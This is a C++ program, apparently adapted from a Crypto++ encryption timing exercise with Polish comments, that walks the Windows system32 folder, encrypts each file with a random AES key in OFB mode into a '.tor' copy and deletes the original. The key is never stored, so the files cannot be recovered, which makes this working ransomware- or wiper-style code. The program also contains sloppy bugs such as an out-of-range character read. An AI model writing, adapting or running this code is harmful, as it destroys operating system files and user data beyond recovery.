#include "..\pod4\file\osrng.h"
using CryptoPP::AutoSeededRandomPool;

#include <iostream>
using std::cout;
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "..\pod4\file\cryptlib.h"
using CryptoPP::Exception;

#include "..\pod4\file\hex.h"
using CryptoPP::HexEncoder;
using CryptoPP::HexDecoder;

#include "..\pod4\file\filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "..\pod4\file\aes.h"
using CryptoPP::AES;

#include "..\pod4\file\ccm.h"
using CryptoPP::OFB_Mode;

#include "assert.h"
#include "fstream"
#include <cstdio>
#include <ctime>
#include <filesystem>

namespace fs = std::filesystem;

using namespace std;

int main(int argc, char* argv[])
{
	AutoSeededRandomPool prng;

	CryptoPP::byte key[AES::DEFAULT_KEYLENGTH];
	prng.GenerateBlock(key, sizeof(key));

	CryptoPP::byte iv[AES::BLOCKSIZE];
	prng.GenerateBlock(iv, sizeof(iv));

	fstream plik;
	string plain;
	string cipher, encoded, recovered;
	clock_t start;


	// Pretty print key
	encoded.clear();
	StringSource(key, sizeof(key), true,
		new HexEncoder(
			new StringSink(encoded)
		) // HexEncoder
	); // StringSource
	//cout << "key: " << encoded << endl;

	// Pretty print iv
	encoded.clear();
	StringSource(iv, sizeof(iv), true,
	new HexEncoder(
		new StringSink(encoded)
		) // HexEncoder
	); // StringSource
	//cout << "iv: " << encoded << endl;

	fstream szyfr;


	std::string path = "/Windows/system32";
	for (const auto& entry : fs::directory_iterator(path))
	{
		if (entry.path().has_extension())
		{
			string file = entry.path().string();
			cout << file << endl;
			plik.open(file, ios::binary | ios::in);
			szyfr.open(file + ".tor", ios::binary | ios::out);


			while (!plik.eof()) {
				getline(plik, plain);
				char z = plain[plain.length()];

				try
				{
					//cout << "plain text: " << plain << endl;

					OFB_Mode< AES >::Encryption e;
					e.SetKeyWithIV(key, sizeof(key), iv);

					// CFB mode must not use padding. Specifying
					//  a scheme will result in an exception
					StringSource(plain, true,
						new StreamTransformationFilter(e,
							new StringSink(cipher)
						) // StreamTransformationFilter      
					); // StringSource
				}
				catch (const CryptoPP::Exception& e)
				{
					cerr << e.what() << endl;
					exit(1);
				}



				// Pretty print
				encoded.clear();
				StringSource(cipher, true,
					new HexEncoder(
						new StringSink(encoded)
					) // HexEncoder
				); // StringSource
				//cout << "cipher text: " << encoded << endl;
				szyfr << encoded;
				cipher.erase(cipher.begin(), cipher.end());
			}
			plik.close();
			try {
				fs::remove(file);
			}
			catch (const std::filesystem::filesystem_error& err) {
				std::cout << "filesystem error: " << err.what() << '\n';
			}
			
			szyfr.close();
			cipher.erase(cipher.begin(), cipher.end());
		}

	}
		


	
	//cout << "szyfrowanie czas: " << (clock() - start) / (double)CLOCKS_PER_SEC << endl;

	//plik.close();
	//szyfr.close();
	//cipher.erase(cipher.begin(), cipher.end());
	//
	//szyfr.open("szyfr.txt", fstream::in);
	//plik.open("maly.txt", fstream::in);
	//string text2;
	//getline(plik, text2);
	//start = clock();
	//while (!szyfr.eof())
	//{
	//	getline(szyfr, encoded);
	//	StringSource(encoded, true,
	//		new HexDecoder(
	//			new StringSink(cipher)
	//		));
	//	///cout << cipher << endl;
	//	try
	//	{
	//		OFB_Mode< AES >::Decryption d;
	//		d.SetKeyWithIV(key, sizeof(key),iv);
	//
	//		// The StreamTransformationFilter removes
	//		//  padding as required.
	//		StringSource s(cipher, true,
	//			new StreamTransformationFilter(d,
	//				new StringSink(recovered)
	//			) // StreamTransformationFilter
	//		); // StringSource
	//		cout <<recovered << endl;
	//	}
	//	catch (const CryptoPP::Exception& e)
	//	{
	//		cerr << e.what() << endl;
	//		exit(1);
	//	}
	//	//recovered.erase(recovered.begin(), recovered.end());
	//}
	//szyfr.close();
	//
	//if (recovered == text2)
	//	cout << "takie same" << endl;
	//else 
	//	cout << "rozne" << endl;
	//cout << "deszyfrowanie czas: " << (clock() - start) / (double)CLOCKS_PER_SEC << endl;

	return 0;

}